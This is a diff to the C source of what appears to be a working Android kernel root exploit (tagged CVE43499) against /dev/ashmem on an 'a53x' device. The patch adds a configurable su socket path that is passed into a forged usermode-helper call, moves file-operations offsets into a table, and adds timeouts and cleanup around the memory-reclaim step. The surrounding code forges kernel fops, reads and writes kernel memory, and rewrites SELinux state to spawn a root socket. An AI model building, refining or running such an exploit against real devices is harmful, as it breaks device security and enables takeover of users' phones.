@@ -2,6 +2,8 @@
 
 #include <errno.h>
 #include <fcntl.h>
+#include <limits.h>
+#include <poll.h>
 #include <signal.h>
 #include <stddef.h>
 #include <stdint.h>
@@ -13,12 +15,12 @@
 #include <sys/socket.h>
 #include <sys/un.h>
 #include <sys/wait.h>
+#include <time.h>
 #include <unistd.h>
 
 #include "target.h"
+#include "fops_table.h"
 
-#define FOPS_OFFSET 0x100
-#define FOPS_TABLE_SIZE 0x120
 #define ASHMEM_NAME_LEN 256
 #define ASHMEM_NAME_PREFIX_LEN 11
 #define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL
@@ -32,6 +34,9 @@
 #define KS_SELINUX_LOCK_OFF 0xb00
 #define KS_OWNER_LOCK_OFF 0xc00
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
+#define SU_SOCKET_ENV "CVE43499_SU_SOCKET"
+#define SU_SOCKET_PATH_OFF 0x200
+#define RECLAIM_ATTEMPT_TIMEOUT_MS 120000
 
 struct umh_subprocess_info {
   unsigned char work[48];
@@ -60,7 +65,7 @@ struct umh_kernel_data {
   char path[256];
   char arg[16];
   char uid[16];
-  uint64_t argv[4];
+  uint64_t argv[5];
   uint64_t envp[1];
 };
 
@@ -105,6 +110,21 @@ static _Noreturn void die(const char *where) {
 
   fprintf(stderr, "FAIL %s errno=%d %s\n", where, error, strerror(error));
   exit(1);
+}
+
+static long long now_ms(void) {
+  struct timespec timestamp;
+
+  if (clock_gettime(CLOCK_MONOTONIC, &timestamp))
+    die("clock_gettime");
+  return (long long)timestamp.tv_sec * 1000 +
+         (long long)timestamp.tv_nsec / 1000000;
+}
+
+static const char *su_socket_path(void) {
+  const char *override = getenv(SU_SOCKET_ENV);
+
+  return override && *override ? override : ROOT_SOCKET_PATH;
 }
 
 static void put64(unsigned char *page, size_t offset, uint64_t value) {
@@ -329,6 +349,7 @@ static int is_direct_pointer(uint64_t value) {
 
 static int root_socket_ready(void) {
   struct sockaddr_un address;
+  const char *path = su_socket_path();
   int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
   int ready;
 
@@ -336,7 +357,7 @@ static int root_socket_ready(void) {
     return 0;
   memset(&address, 0, sizeof(address));
   address.sun_family = AF_UNIX;
-  snprintf(address.sun_path, sizeof(address.sun_path), "%s", ROOT_SOCKET_PATH);
+  snprintf(address.sun_path, sizeof(address.sun_path), "%s", path);
   ready = connect(fd, (struct sockaddr *)&address, sizeof(address)) == 0;
   close(fd);
   return ready;
@@ -458,6 +479,8 @@ static int install_umh_root(int fd, uint64_t alias, uint64_t slide) {
   data.argv[0] = data_address + offsetof(struct umh_kernel_data, path);
   data.argv[1] = data_address + offsetof(struct umh_kernel_data, arg);
   data.argv[2] = data_address + offsetof(struct umh_kernel_data, uid);
+  data.argv[3] = data_address + SU_SOCKET_PATH_OFF;
+  data.argv[4] = 0;
   data.envp[0] = 0;
 
   memset(&fake, 0, sizeof(fake));
@@ -473,8 +496,10 @@ static int install_umh_root(int fd, uint64_t alias, uint64_t slide) {
   fake.argv = data_address + offsetof(struct umh_kernel_data, argv);
   fake.envp = data_address + offsetof(struct umh_kernel_data, envp);
 
-  unlink(ROOT_SOCKET_PATH);
+  unlink(su_socket_path());
   if (!write_exact(fd, data_address, &data, sizeof(data)) ||
+      !write_exact(fd, data_address + SU_SOCKET_PATH_OFF, su_socket_path(),
+                   strlen(su_socket_path()) + 1) ||
       !write_exact(fd, work, &fake, sizeof(fake))) {
     fprintf(stderr, "ROOT_FAIL payload write errno=%d %s\n", errno,
             strerror(errno));
@@ -542,50 +567,10 @@ static _Noreturn void hold_root_failure(void) {
     pause();
 }
 
-static uint64_t expected_fops_slot(size_t offset, uint64_t slide) {
-  uint64_t image = 0;
-
-  switch (offset) {
-  case 0x08:
-    image = ASHMEM_FOPS_08_IMAGE;
-    break;
-  case 0x10:
-    image = ASHMEM_FOPS_10_IMAGE;
-    break;
-  case 0x18:
-    image = ASHMEM_FOPS_18_IMAGE;
-    break;
-  case 0x50:
-    image = ASHMEM_FOPS_50_IMAGE;
-    break;
-  case 0x58:
-    image = ASHMEM_FOPS_58_IMAGE;
-    break;
-  case 0x60:
-    image = ASHMEM_FOPS_60_IMAGE;
-    break;
-  case 0x70:
-    image = ASHMEM_FOPS_70_IMAGE;
-    break;
-  case 0x80:
-    image = ASHMEM_FOPS_80_IMAGE;
-    break;
-  case 0xc8:
-    image = ASHMEM_FOPS_C8_IMAGE;
-    break;
-  case 0xe0:
-    image = ASHMEM_FOPS_E0_IMAGE;
-    break;
-  default:
-    break;
-  }
-  return image ? image + slide : 0;
-}
-
 static int kernel_fops_valid(int fd, uint64_t fops, uint64_t slide) {
-  for (size_t offset = 0; offset < FOPS_TABLE_SIZE; offset += 8) {
+  for (size_t offset = 0; offset < A53X_FOPS_TABLE_SIZE; offset += 8) {
     uint64_t actual;
-    uint64_t expected = expected_fops_slot(offset, slide);
+    uint64_t expected = a53x_fops_value(offset, slide);
 
     if (!read64(fd, fops + offset, &actual) || actual != expected)
       return 0;
@@ -624,14 +609,14 @@ static int prove_and_restore_fops(uint64_t alias, uint64_t slide) {
   fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
   if (fd < 0)
     hold_dirty_failure("open forged ashmem");
-  slots_ok = kernel_fops_valid(fd, alias + FOPS_OFFSET, slide);
+  slots_ok = kernel_fops_valid(fd, alias + A53X_FOPS_OFFSET, slide);
   read_before = kernel_read(fd, fops_target, &before, sizeof(before));
   read_scratch = kernel_read(fd, scratch, &readback, sizeof(readback));
   write_scratch =
       kernel_write(fd, scratch, &write_marker, sizeof(write_marker));
   read_after = kernel_read(fd, scratch, &kernel_after, sizeof(kernel_after));
   clear_fake_owner =
-      write64(fd, alias + FOPS_OFFSET, 0) ? (ssize_t)sizeof(uint64_t) : -1;
+      write64(fd, alias + A53X_FOPS_OFFSET, 0) ? (ssize_t)sizeof(uint64_t) : -1;
   restore_selinux = kernel_write(fd, SELINUX_STATE_ALIAS + slide, &selinux_live,
                                  sizeof(selinux_live));
   read_selinux = kernel_read(fd, SELINUX_STATE_ALIAS + slide, &selinux_readback,
@@ -648,7 +633,7 @@ static int prove_and_restore_fops(uint64_t alias, uint64_t slide) {
          read_restored, (unsigned long long)restored);
   fflush(stdout);
   if (!slots_ok || read_before != (ssize_t)sizeof(before) ||
-      before != alias + FOPS_OFFSET ||
+      before != alias + A53X_FOPS_OFFSET ||
       read_scratch != (ssize_t)sizeof(readback) || readback != read_marker ||
       write_scratch != (ssize_t)sizeof(write_marker) ||
       read_after != (ssize_t)sizeof(kernel_after) ||
@@ -709,7 +694,7 @@ static _Noreturn void hold_page_common(unsigned char *target, uint64_t alias,
   printf("fops pid=%d pfn=0 lock=%#llx fops=%#llx target=%#llx "
          "original=%#llx user=%p\n",
          getpid(), (unsigned long long)alias,
-         (unsigned long long)(alias + FOPS_OFFSET),
+         (unsigned long long)(alias + A53X_FOPS_OFFSET),
          (unsigned long long)(ASHMEM_MISC_FOPS_ALIAS + slide),
          (unsigned long long)(ASHMEM_FOPS_IMAGE + slide), target);
   fflush(stdout);
@@ -772,13 +757,35 @@ static _Noreturn void hold_reclaimed_page(uint64_t slide) {
 
   g_slide = slide;
   for (int attempt = 0; attempt < 4 && !base; ++attempt) {
+    long long deadline;
+
     if (attempt)
       usleep(500 * 1000);
     probe_pid = spawn_reclaim(slide, &read_fd);
     stream = fdopen(read_fd, "r");
     if (!stream)
       die("fdopen reclaim");
-    while (fgets(line, sizeof(line), stream)) {
+    deadline = now_ms() + RECLAIM_ATTEMPT_TIMEOUT_MS;
+    for (;;) {
+      struct pollfd poll_fd = {.fd = read_fd, .events = POLLIN};
+      long long remaining = deadline - now_ms();
+      int poll_result;
+
+      if (probe_pid <= 0)
+        break;
+      if (remaining <= 0)
+        break;
+      poll_result = poll(&poll_fd, 1,
+                         remaining > INT_MAX ? INT_MAX : (int)remaining);
+      if (poll_result < 0) {
+        if (errno == EINTR)
+          continue;
+        die("poll reclaim");
+      }
+      if (!poll_result)
+        break;
+      if (!fgets(line, sizeof(line), stream))
+        break;
       printf("ks: %s", line);
       fflush(stdout);
       if (sscanf(line,
@@ -790,8 +797,20 @@ static _Noreturn void hold_reclaimed_page(uint64_t slide) {
         break;
     }
     fclose(stream);
-    if (!base)
-      waitpid(probe_pid, NULL, 0);
+    if (!base && probe_pid > 0) {
+      int status;
+      pid_t waited;
+
+      /* A reclaim child that neither reported a ready base nor a failure can
+       * have left paused grand-children behind; make sure it is gone before
+       * the next attempt. */
+      if (kill(probe_pid, SIGKILL) && errno != ESRCH)
+        die("kill stuck reclaim");
+      do {
+        waited = waitpid(probe_pid, &status, 0);
+      } while (waited < 0 && errno == EINTR);
+      probe_pid = -1;
+    }
   }
   if (!base || (base & (page_size - 1))) {
     errno = EPROTO;
